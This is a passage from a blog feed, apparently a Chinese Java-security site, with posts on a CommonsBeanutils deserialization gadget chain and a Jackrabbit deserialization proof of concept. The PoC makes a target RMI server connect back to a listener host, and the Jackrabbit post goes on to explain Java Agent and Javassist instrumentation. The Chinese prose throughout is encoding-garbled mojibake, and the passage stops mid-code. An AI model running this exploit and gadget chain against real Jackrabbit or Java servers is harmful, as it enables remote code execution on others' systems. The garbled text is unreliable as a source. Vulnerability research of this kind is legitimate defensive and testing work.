class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, SerializationHandler[] handlers)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">transform</span><span class="hljs-params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="hljs-keyword">throws</span> TransletException &#123;<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="é“¾æ¡"><a href="#é“¾æ¡" class="headerlink" title="é“¾æ¡"></a>é“¾æ¡</h4><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PriorityQueue</span>.</span></span>read<span class="hljs-constructor">Object()</span><br>    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">BeanComparator</span>.</span></span>compare<span class="hljs-literal">()</span><br>            <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtils</span>.</span></span>get<span class="hljs-constructor">Property()</span><br>                <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">PropertyUtilsBean</span>.</span></span>get<span class="hljs-constructor">Property()</span><br>                    <span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">TemplatesImpl</span>.</span></span>get<span class="hljs-constructor">OutputProperties()</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Instrumentæ’æ¡©æŠ€æœ¯æ¥åŸ‹Jackrabbitçš„å‘</title>
    <link href="/2023/09/28/Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E6%9D%A5%E5%9F%8BJackrabbit%E7%9A%84%E5%9D%91/"/>
    <url>/2023/09/28/Instrument%E6%8F%92%E6%A1%A9%E6%8A%80%E6%9C%AF%E6%9D%A5%E5%9F%8BJackrabbit%E7%9A%84%E5%9D%91/</url>
    
    <content type="html"><![CDATA[<h1 id="ç”¨Java-Instrumentæ’æ¡©æŠ€æœ¯æ¥åŸ‹Jackrabbitçš„å‘"><a href="#ç”¨Java-Instrumentæ’æ¡©æŠ€æœ¯æ¥åŸ‹Jackrabbitçš„å‘" class="headerlink" title="ç”¨Java Instrumentæ’æ¡©æŠ€æœ¯æ¥åŸ‹Jackrabbitçš„å‘"></a>ç”¨Java Instrumentæ’æ¡©æŠ€æœ¯æ¥åŸ‹Jackrabbitçš„å‘</h1><h2 id="èµ·å› ï¼š"><a href="#èµ·å› ï¼š" class="headerlink" title="èµ·å› ï¼š"></a>èµ·å› ï¼š</h2><p>å‰æ®µæ—¶é—´åœ¨åšå®¢ä¸Šåˆ†äº«è¿‡Jackrabbitçš„ååºåˆ—åŒ–æ¼æ´ï¼Œä¹Ÿå†™å¥½äº†POCã€‚å› ä¸ºæ˜¯POCæˆ‘å°±æ²¡æœ‰ç”¨CBé“¾ï¼Œè€Œæ˜¯ç”¨RMIçš„JRMPå»åšå›è¿è¿›è¡Œæ£€æµ‹ã€‚å¾€å¾€æœ€æ‚ é—²çš„æ—¶å€™å°±æ˜¯æœ€å±é™©çš„æ—¶å€™ã€‚è¿™ä¸ªæ—¶å€™å¸ˆçˆ¶åœ¨å¤æµ‹POCçš„æ—¶å€™å‘ç°POCç«Ÿç„¶æ‰“ä¸äº†ï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œï¼Œå¸ˆçˆ¶è¯´è®©æˆ‘å°½é‡åœ¨æµ‹è¯•çš„æ—¶å€™ä¸è¦åœ¨æœ¬åœ°æµ‹ã€‚å°±å› ä¸ºè¿™ä¸€å¥è¯ï¼Œæ‰æœ‰æˆ‘ä»¬ä»Šå¤©çš„æ–‡ç« ï¼ˆå…ˆé™„ä¸ŠJRMPçš„POCï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">targetUrl</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;http://10.65.14.247:8080/rmi&quot;</span>;<br><br>String host= <span class="hljs-string">&quot;10.65.14.146&quot;</span>;<span class="hljs-comment">//å›è¿</span><br><span class="hljs-type">int</span> <span class="hljs-variable">port</span> <span class="hljs-operator">=</span> <span class="hljs-number">7878</span>;<br>java.rmi.server.<span class="hljs-type">ObjID</span> <span class="hljs-variable">objId</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.rmi.server.ObjID();<br>sun.rmi.transport.tcp.<span class="hljs-type">TCPEndpoint</span> <span class="hljs-variable">endpoint</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.tcp.TCPEndpoint(host, port);<br>sun.rmi.transport.<span class="hljs-type">LiveRef</span> <span class="hljs-variable">liveRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.transport.LiveRef(objId, endpoint, <span class="hljs-literal">false</span>);<br><span class="hljs-type">UnicastRef</span> <span class="hljs-variable">unicastRef</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">sun</span>.rmi.server.UnicastRef(liveRef);<br><br><span class="hljs-type">SimpleCredentials</span> <span class="hljs-variable">exp</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleCredentials</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;admin&quot;</span>.toCharArray());<br>exp.setAttribute( <span class="hljs-string">&quot;admin111&quot;</span>,unicastRef);<br><span class="hljs-type">Repository</span> <span class="hljs-variable">repository</span> <span class="hljs-operator">=</span>  <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLRemoteRepository</span>(targetUrl);<span class="hljs-comment">//ç›®æ ‡åœ°å€  eg:     http://10.65.14.247:8080/rmi</span><br><br>repository.login(exp);<br></code></pre></td></tr></table></figure><p>æˆ‘å½“æ—¶æ€€ç€å¿å¿‘çš„å¿ƒæƒ…ï¼Œé‡æ–°æµ‹äº†ä¸€ä¸‹ã€‚å‘ç°ç¡®å®æ‰“ä¸äº†ã€‚è¿™æ—¶å€™æˆ‘å°±åœ¨æƒ³ä¸ºä»€ä¹ˆä¼šæ‰“ä¸é€šã€‚æˆ‘å…ˆç»™å¤§å®¶ç†ä¸€ä¸‹ä»–ä»¬ä¹‹é—´çš„é€šä¿¡è¿‡ç¨‹ï¼ˆå‡è®¾æˆ‘ä»¬åœ¨å®¢æˆ·ç«¯å¼€å¯JRMPç›‘å¬ï¼‰ã€‚</p><p><img src="https://i.mji.rip/2023/09/28/421c7bb331bfc66f81b90f25526cba8e.png" alt="image-20230928160652243"></p><p>è§£é‡Šï¼š</p><ol><li>é¦–å…ˆå®¢æˆ·ç«¯å…ˆå°†æ¶æ„payloadå‘é€ç»™æœåŠ¡ç«¯ã€‚</li><li>æœåŠ¡ç«¯å¤„ç†åå…ˆè¿”å›<code>RemoteRepositoryxr</code>çš„IPå’Œç«¯å£</li><li>å®¢æˆ·ç«¯è¯·æ±‚è¿æ¥æœåŠ¡ç«¯<code>RemoteRepositoryxr</code>çš„IPå’Œç«¯å£</li><li>æœåŠ¡ç«¯JRMPå›è¿</li></ol><p>æ•´ä½“æµç¨‹å¤§æ¦‚æ˜¯è¿™æ ·çš„ã€‚ä½†æ˜¯é—®é¢˜å‡ºåœ¨äº†ç¬¬2æ­¥ã€‚æˆ‘ä»¬çœ‹çœ‹å…·ä½“çš„ä»£ç é€»è¾‘ã€‚</p><p><img src="https://i.mji.rip/2023/09/28/03c8453cf5984c5539c4029c09785de2.png" alt="image-20230928161611082"></p><p><img src="https://i.mji.rip/2023/09/28/4113e32ad3e83ddd54e2d60a90fff846.png" alt="image-20230928161707638"></p><p>çœ‹è¿‡æˆ‘ä¹‹å‰RMIæ–‡ç« çš„æœ‹å‹åº”è¯¥å¯¹è¿™ä¸ªç±»æœ‰å°è±¡ã€‚å†å¾€é‡Œè·Ÿå‘ç°æ¥åˆ°äº†<code>TCPEndPoint</code>å‘ç°å†æ„é€ æ–¹æ³•èµ‹å€¼ï¼š</p><p><img src="https://i.mji.rip/2023/09/28/55070b03026d6e61a2a472a48c08c0c7.png" alt="image-20230928162050472"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ä¸¤ä¸ªå‚æ•°çš„æ„é€ æ–¹æ³•è¢«è°ƒç”¨ï¼Œé‡Œé¢å†è°ƒå››ä¸ªå‚æ•°çš„æ„é€ æ–¹æ³•ï¼Œæœ€åå†ç»™å…¨å±€å˜é‡èµ‹å€¼ã€‚çœ¼è§çš„æœ‹å‹å·²ç»å‘ç°é—®é¢˜äº†ã€‚æœåŠ¡ç«¯è¿”å›ç»™æˆ‘ä»¬çš„æ˜¯IPåœ°å€æ˜¯â€192.168.56.1â€œï¼Œä¹Ÿå°±æ˜¯è¯´å®¢æˆ·ç«¯æ¥æ”¶åˆ°çš„æ˜¯ä¸ªç§æœ‰åœ°å€ï¼Œé‚£å®¢æˆ·ç«¯æ¯æ¬¡å‘èµ·ç¬¬å››æ¬¡è¯·æ±‚çš„IPåœ°å€ä¹Ÿå°±æ˜¯è¿™ä¸ªç§æœ‰åœ°å€ã€‚è¿™æ€ä¹ˆèƒ½è®¿é—®åˆ°å‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ</p><h2 id="åæ€"><a href="#åæ€" class="headerlink" title="åæ€"></a>åæ€</h2><p>ç°åœ¨æˆ‘ä»¬æ¢³ç†ä¸€ä¸‹é—®é¢˜ï¼š</p><ol><li>å®¢æˆ·ç«¯æ¥æ”¶çš„IPæ˜¯ç§æœ‰IPï¼Œæ²¡åŠæ³•åˆ°è¾¾å®¢æˆ·ç«¯</li><li>è¿”å›çš„ç«¯å£æ˜¯éšæœºç«¯å£ï¼Œæ‰€ä»¥ä¸èƒ½å‘ä¸¤æ¬¡è¯·æ±‚</li></ol><p>è¿™ä¸ªå°±æ˜¯æˆ‘ä»¬åœ¨æœ¬åœ°æµ‹è¯•èƒ½æˆåŠŸçš„åŸå› ã€‚å› ä¸ºå®ƒè¿”å›çš„è¿™ä¸ªåœ°å€æ˜¯VirtualBoxçš„Host-Onlyï¼Œæœ¬åœ°è®¿é—®è‚¯å®šæ˜¯å¯ä»¥æ‰§è¡Œçš„</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell">Ethernet adapter VirtualBox Host<span class="hljs-literal">-Only</span> Network:<br><br>   Connection<span class="hljs-literal">-specific</span> DNS Suffix  . :<br>   Link<span class="hljs-literal">-local</span> IPv6 Address . . . . . : fe80::b684:<span class="hljs-number">6</span>aef:<span class="hljs-number">25</span>bc:e545%<span class="hljs-number">9</span><br>   IPv4 Address. . . . . . . . . . . : <span class="hljs-number">192.168</span>.<span class="hljs-number">56.1</span><br>   Subnet Mask . . . . . . . . . . . : <span class="hljs-number">255.255</span>.<span class="hljs-number">255.0</span><br>   Default Gateway . . . . . . . . . :<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬è¯¥æ€ä¹ˆè§£å†³è¿™ä¸ªé—®é¢˜å‘¢ï¼Ÿ</p><ol><li><p>ç¼–å†™youdebugè¿›è¡Œæ›´æ”¹  ï¼ˆç®€å•æ˜“æ“ä½œï¼‰ <a href="https://youdebug.kohsuke.org/">å®˜ç½‘æœ‰ä½¿ç”¨æ–¹æ³•</a></p></li><li><p>ç”¨IDEAæ‰‹åŠ¨å¯¹IPè¿›è¡Œset    ï¼ˆä¸å¤ªç°å®ï¼Œéœ€è¦è‡ªåŠ¨åŒ–ï¼‰</p></li><li><p>åˆ©ç”¨JavaAgent+Javassistè¿›è¡Œæ’æ¡©   ï¼ˆæ­£å¥½åˆé€‚ï¼‰</p></li></ol><h2 id="JavaAgent"><a href="#JavaAgent" class="headerlink" title="JavaAgent"></a>JavaAgent</h2><h3 id="æ¦‚å¿µï¼š"><a href="#æ¦‚å¿µï¼š" class="headerlink" title="æ¦‚å¿µï¼š"></a>æ¦‚å¿µï¼š</h3><p><code>JDK1.5</code>å¼€å§‹ï¼Œ<code>Java</code>æ–°å¢äº†<code>Instrumentation(Java Agent API)</code>å’Œ<code>JVMTI(JVM Tool Interface)</code>åŠŸèƒ½ï¼Œå…è®¸<code>JVM</code>åœ¨åŠ è½½æŸä¸ª<code>classæ–‡ä»¶</code>ä¹‹å‰å¯¹å…¶å­—èŠ‚ç è¿›è¡Œä¿®æ”¹ï¼ŒåŒæ—¶ä¹Ÿæ”¯æŒå¯¹å·²åŠ è½½çš„<code>class(ç±»å­—èŠ‚ç )</code>è¿›è¡Œé‡æ–°åŠ è½½(<code>Retransform</code>)ã€‚</p><p>åˆ©ç”¨<code>Java Agent</code>è¿™ä¸€ç‰¹æ€§è¡ç”Ÿå‡ºäº†<code>APM(Application Performance Managementï¼Œåº”ç”¨æ€§èƒ½ç®¡ç†)</code>ã€<code>RASP(Runtime application self-protectionï¼Œè¿è¡Œæ—¶åº”ç”¨è‡ªæˆ‘ä¿æŠ¤)</code>ã€<code>IAST(Interactive Application Security Testingï¼Œäº¤äº’å¼åº”ç”¨ç¨‹åºå®‰å…¨æµ‹è¯•)</code>ç­‰ç›¸å…³äº§å“ï¼Œå®ƒä»¬éƒ½æ— ä¸€ä¾‹å¤–çš„ä½¿ç”¨äº†<code>Instrumentation/JVMTI</code>çš„<code>API</code>æ¥å®ç°åŠ¨æ€ä¿®æ”¹<code>Javaç±»å­—èŠ‚ç </code>å¹¶æ’å…¥ç›‘æ§æˆ–æ£€æµ‹ä»£ç ã€‚</p><p><strong><code>Java Agent</code>æœ‰ä¸¤ç§è¿è¡Œæ¨¡å¼ï¼š</strong></p><ol><li>å¯åŠ¨<code>Javaç¨‹åº</code>æ—¶æ·»åŠ <code>-javaagent(Instrumentation APIå®ç°æ–¹å¼)</code>æˆ–<code>-agentpath/-agentlib(JVMTIçš„å®ç°æ–¹å¼)</code>å‚æ•°ï¼Œå¦‚<code>java -javaagent:/data/XXX.jar LingXeTest</code>ã€‚</li><li><code>JDK1.6</code>æ–°å¢äº†<code>attach(é™„åŠ æ–¹å¼)</code>æ–¹å¼ï¼Œå¯ä»¥å¯¹è¿è¡Œä¸­çš„<code>Javaè¿›ç¨‹</code>é™„åŠ <code>Agent</code>ã€‚</li></ol><p>è¿™ä¸¤ç§è¿è¡Œæ–¹å¼çš„æœ€å¤§åŒºåˆ«åœ¨äºç¬¬ä¸€ç§æ–¹å¼åªèƒ½åœ¨ç¨‹åºå¯åŠ¨æ—¶æŒ‡å®š<code>Agent</code>æ–‡ä»¶ï¼Œè€Œ<code>attach</code>æ–¹å¼å¯ä»¥åœ¨<code>Javaç¨‹åº</code>è¿è¡Œåæ ¹æ®<code>è¿›ç¨‹ID</code>åŠ¨æ€æ³¨å…¥<code>Agent</code>åˆ°<code>JVM</code>ã€‚</p><p>Java Agentè¿˜é™åˆ¶äº†æˆ‘ä»¬å¿…é¡»ä»¥jaråŒ…çš„å½¢å¼è¿è¡Œæˆ–åŠ è½½ï¼Œæˆ‘ä»¬å¿…é¡»å°†ç¼–å†™å¥½çš„Agentç¨‹åºæ‰“åŒ…æˆä¸€ä¸ªjaræ–‡ä»¶ã€‚é™¤æ­¤ä¹‹å¤–ï¼ŒJava Agentè¿˜å¼ºåˆ¶è¦æ±‚äº†æ‰€æœ‰çš„jaræ–‡ä»¶ä¸­å¿…é¡»åŒ…å«<code>/META-INF/MANIFEST.MF</code>æ–‡ä»¶ï¼Œä¸”è¯¥æ–‡ä»¶ä¸­å¿…é¡»å®šä¹‰å¥½<code>Premain-Class</code>ï¼ˆAgentæ¨¡å¼ï¼‰æˆ–<code>Agent-Class:</code>ï¼ˆAgentæ¨¡å¼ï¼‰é…ç½®ï¼Œå¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">Premain-Class: com.anbai.sec.agent.CrackLicenseAgent<br>Agent-Class: com.anbai.sec.agent.CrackLicenseAgent<br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬éœ€è¦ä¿®æ”¹å·²ç»è¢«JVMåŠ è½½è¿‡çš„ç±»çš„å­—èŠ‚ç ï¼Œé‚£ä¹ˆè¿˜éœ€è¦è®¾ç½®åœ¨<code>MANIFEST.MF</code>ä¸­æ·»åŠ <code>Can-Retransform-Classes: true</code>æˆ–<code>Can-Redefine-Classes: true</code>ã€‚</p><p><strong>ç®€å•æ¥è¯´Anegtå°±ç›¸å½“äºæ˜¯ä¸€ä¸ªä»£ç†ä¸€æ ·ï¼Œæˆ‘ä»¬çŸ¥é“javaæ–‡ä»¶æ‰§è¡Œçš„æ—¶å€™å…ˆæ˜¯.javaæ–‡ä»¶è¢«ç¼–è¯‘æˆ.classæ–‡ä»¶ï¼Œç„¶åJVMåˆ©ç”¨ç±»åŠ è½½å™¨åŠ è½½.classæ–‡ä»¶ã€‚è¿™æ ·javaä»£ç æ‰ä¼šè¢«æ‰§è¡Œã€‚è€ŒAgentçš„ä½œç”¨å°±æ˜¯åœ¨åŠ è½½ä¹‹å‰å…ˆè·å–åˆ°.classæ–‡ä»¶ï¼Œç„¶åå¯¹å…¶è¿›è¡Œæ“ä½œï¼Œåœ¨ç»™ä»–æ”¾è¡Œï¼Œè®©ä»–æŒ‰æˆ‘ä»¬ä¿®æ”¹åçš„æ–‡ä»¶æ‰§è¡Œã€‚</strong></p><p>å…¶å®æœ€ä¸»è¦çš„å°±æ˜¯ä¸‹é¢ä¸¤ä¸ªæ–¹æ³•ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> &#123;&#125;<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬æ­£å¸¸javaä»£ç éƒ½æœ‰mainæ–¹æ³•ï¼Œè€Œè¿™ä¸¤ä¸ªæ–¹æ³•å°±æ˜¯Agnetçš„mainæ–¹æ³•ã€‚</p><p>æ¥æ”¶ä¸¤ä¸ªå‚æ•°ï¼š</p><p>argsï¼šå¦‚æœæˆ‘ä»¬éœ€è¦ç»™Agentä¼ å…¥å‚æ•°ï¼Œå°±å¯ä»¥é€šè¿‡â€“javaagentåä¼ å…¥ï¼ˆç¨åä¼šæœ‰ä¾‹å­ï¼‰</p><p>instï¼šç”±JVMè‡ªåŠ¨ä¼ å…¥</p><h3 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h3><p>ä¸»è¦çœ‹è¿™ä¸ªInstrumentationçš„æ–¹æ³•ï¼ˆæœ¬ç¯‡ä¸»è¦ç”¨addTransformeræ–¹æ³•ï¼‰ï¼š</p><p><img src="https://oss.javasec.org/images/07EC4F97-CD49-41E6-95CE-FEB000325E33.png" alt="img"></p><h3 id="ClassFileTransformer"><a href="#ClassFileTransformer" class="headerlink" title="ClassFileTransformer"></a>ClassFileTransformer</h3><p><code>java.lang.instrument.ClassFileTransformer</code>æ˜¯ä¸€ä¸ªè½¬æ¢ç±»æ–‡ä»¶çš„ä»£ç†æ¥å£ï¼Œæˆ‘ä»¬å¯ä»¥åœ¨è·å–åˆ°<code>Instrumentation</code>å¯¹è±¡åé€šè¿‡<code>addTransformer</code>æ–¹æ³•æ·»åŠ è‡ªå®šä¹‰ç±»æ–‡ä»¶è½¬æ¢å™¨ã€‚</p><p>ç¤ºä¾‹ä¸­æˆ‘ä»¬ä½¿ç”¨äº†<code>addTransformer</code>æ³¨å†Œäº†ä¸€ä¸ªæˆ‘ä»¬è‡ªå®šä¹‰çš„<code>Transformer</code>åˆ°<code>Java Agent</code>ï¼Œå½“æœ‰æ–°çš„ç±»è¢«<code>JVM</code>åŠ è½½æ—¶<code>JVM</code>ä¼šè‡ªåŠ¨å›è°ƒç”¨æˆ‘ä»¬è‡ªå®šä¹‰çš„<code>Transformer</code>ç±»çš„<code>transform</code>æ–¹æ³•ï¼Œä¼ å…¥è¯¥ç±»çš„<code>transform</code>ä¿¡æ¯(<code>ç±»åã€ç±»åŠ è½½å™¨ã€ç±»å­—èŠ‚ç </code>ç­‰)ï¼Œæˆ‘ä»¬å¯ä»¥æ ¹æ®ä¼ å…¥çš„ç±»ä¿¡æ¯å†³å®šæ˜¯å¦éœ€è¦ä¿®æ”¹ç±»å­—èŠ‚ç ï¼Œä¿®æ”¹å®Œå­—èŠ‚ç åæˆ‘ä»¬å°†æ–°çš„ç±»å­—èŠ‚ç è¿”å›ç»™<code>JVM</code>ï¼Œ<code>JVM</code>ä¼šéªŒè¯ç±»å’Œç›¸åº”çš„ä¿®æ”¹æ˜¯å¦åˆæ³•ï¼Œå¦‚æœç¬¦åˆç±»åŠ è½½è¦æ±‚<code>JVM</code>ä¼šåŠ è½½æˆ‘ä»¬ä¿®æ”¹åçš„ç±»å­—èŠ‚ç ã€‚</p><p><strong><code>ClassFileTransformerç±»ä»£ç ï¼š</code></strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> java.lang.instrument;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ClassFileTransformer</span> &#123;<br><br>  <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * ç±»æ–‡ä»¶è½¬æ¢æ–¹æ³•ï¼Œé‡å†™transformæ–¹æ³•å¯è·å–åˆ°å¾…åŠ è½½çš„ç±»ç›¸å…³ä¿¡æ¯</span><br><span class="hljs-comment">     *</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> loader              å®šä¹‰è¦è½¬æ¢çš„ç±»åŠ è½½å™¨ï¼›å¦‚æœæ˜¯å¼•å¯¼åŠ è½½å™¨ï¼Œåˆ™ä¸º null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> className           ç±»å,å¦‚:java/lang/Runtime</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classBeingRedefined å¦‚æœæ˜¯è¢«é‡å®šä¹‰æˆ–é‡è½¬æ¢è§¦å‘ï¼Œåˆ™ä¸ºé‡å®šä¹‰æˆ–é‡è½¬æ¢çš„ç±»ï¼›å¦‚æœæ˜¯ç±»åŠ è½½ï¼Œåˆ™ä¸º null</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> protectionDomain    è¦å®šä¹‰æˆ–é‡å®šä¹‰çš„ç±»çš„ä¿æŠ¤åŸŸ</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@param</span> classfileBuffer     ç±»æ–‡ä»¶æ ¼å¼çš„è¾“å…¥å­—èŠ‚ç¼“å†²åŒºï¼ˆä¸å¾—ä¿®æ”¹ï¼‰</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@return</span> å­—èŠ‚ç byteæ•°ç»„ã€‚</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined,<br>                            ProtectionDomain protectionDomain, <span class="hljs-type">byte</span>[] classfileBuffer);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>ç®€å•è®²å°±æ˜¯ï¼Œæˆ‘ä»¬éœ€è¦å®ç°è¿™ä¸ªæ¥å£å¹¶é‡å†™<code>transform</code>æ–¹æ³•ã€‚è€Œè¿™ä¸ª<code>transform</code>æ–¹æ³•ç®€å•æ¥è¯´å°±æ˜¯ç»™ä½ æƒ³è¦çš„.classæ–‡ä»¶ï¼Œä½ ä¿®æ”¹ä¹‹åå†æŠŠä¿®æ”¹ä¹‹åçš„.classæ–‡ä»¶è¿”å›ç»™å®ƒè®©ä»–ç»§ç»­æ‰§è¡Œï¼ˆç½‘ä¸Šçœ‹äº†å¾ˆå¤šæ–‡ç« ï¼Œæ²¡æœ‰ä¸€ä¸ªæŠŠè¿™ä¸ªæ–¹æ³•è®²æ¸…æ¥šçš„ï¼‰</p><h2 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h2><p>æ¦‚å¿µï¼š</p><p>Javassist æ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†æã€ç¼–è¾‘å’Œåˆ›å»ºJavaå­—èŠ‚ç çš„ç±»åº“. å…¶ä¸»è¦ä¼˜ç‚¹åœ¨äºç®€å•å¿«é€Ÿ. ç›´æ¥ä½¿ç”¨ java ç¼–ç çš„å½¢å¼, è€Œä¸éœ€è¦äº†è§£è™šæ‹ŸæœºæŒ‡ä»¤, å°±èƒ½åŠ¨æ€æ”¹å˜ç±»çš„ç»“æ„, æˆ–è€…åŠ¨æ€ç”Ÿæˆç±».</p><p>Javassistä¸­æœ€ä¸ºé‡è¦çš„æ˜¯<code>ClassPool</code>,<code>CtClass</code>, <code>CtMethod</code>ä»¥åŠ<code>CtField</code>è¿™å‡ ä¸ªç±».</p><ul><li><code>ClassPool</code>: ä¸€ä¸ªåŸºäº<code>Hashtable</code>å®ç°çš„<code>CtClass</code>å¯¹è±¡å®¹å™¨, å…¶ä¸­é”®æ˜¯ç±»åç§°, å€¼æ˜¯è¡¨ç¤ºè¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡</li><li><code>CtClass</code>: <code>CtClass</code>è¡¨ç¤ºç±», ä¸€ä¸ª<code>CtClass</code>(ç¼–è¯‘æ—¶ç±»)å¯¹è±¡å¯ä»¥å¤„ç†ä¸€ä¸ªclassæ–‡ä»¶, è¿™äº›<code>CtClass</code>å¯¹è±¡å¯ä»¥ä»<code>ClassPool</code>è·å¾—</li><li><code>CtMethods</code>: è¡¨ç¤ºç±»ä¸­çš„æ–¹æ³•</li><li><code>CtFields</code>: è¡¨ç¤ºç±»ä¸­çš„å­—æ®µ</li></ul><h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><ul><li><code>getDefault</code>: è¿”å›é»˜è®¤çš„<code>ClassPool</code>æ˜¯å•ä¾‹æ¨¡å¼çš„ï¼Œä¸€èˆ¬é€šè¿‡è¯¥æ–¹æ³•åˆ›å»ºæˆ‘ä»¬çš„<code>ClassPool</code>ï¼›</li><li><code>appendClassPath</code>, <code>insertClassPath</code> : å°†ä¸€ä¸ª<code>ClassPath</code>åŠ åˆ°ç±»æœç´¢è·¯å¾„çš„æœ«å°¾ä½ç½® æˆ– æ’å…¥åˆ°èµ·å§‹ä½ç½®ã€‚é€šå¸¸é€šè¿‡è¯¥æ–¹æ³•å†™å…¥é¢å¤–çš„ç±»æœç´¢è·¯å¾„ï¼Œä»¥è§£å†³å¤šä¸ªç±»åŠ è½½å™¨ç¯å¢ƒä¸­æ‰¾ä¸åˆ°ç±»çš„å°´å°¬ï¼›</li><li><code>toClass</code> : å°†ä¿®æ”¹åçš„<code>CtClass</code>åŠ è½½è‡³å½“å‰çº¿ç¨‹çš„ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨ä¸­ï¼Œ<code>CtClass</code>çš„<code>toClass</code>æ–¹æ³•æ˜¯é€šè¿‡è°ƒç”¨æœ¬æ–¹æ³•å®ç°ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ä¸€æ—¦è°ƒç”¨è¯¥æ–¹æ³•ï¼Œåˆ™æ— æ³•ç»§ç»­ä¿®æ”¹å·²ç»è¢«åŠ è½½çš„classï¼›</li><li><code>get</code> , <code>getCtClass</code>: æ ¹æ®ç±»è·¯å¾„åè·å–è¯¥ç±»çš„<code>CtClass</code>å¯¹è±¡ï¼Œç”¨äºåç»­çš„ç¼–è¾‘ã€‚</li></ul><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs reasonml"><span class="hljs-comment">// è·å–ClassPoolå¯¹è±¡, ä½¿ç”¨ç³»ç»Ÿé»˜è®¤ç±»è·¯å¾„</span><br>ClassPool pool = <span class="hljs-keyword">new</span> <span class="hljs-constructor">ClassPool(<span class="hljs-params">true</span>)</span>;<br><span class="hljs-comment">// æ•ˆæœä¸ new ClassPool(true) 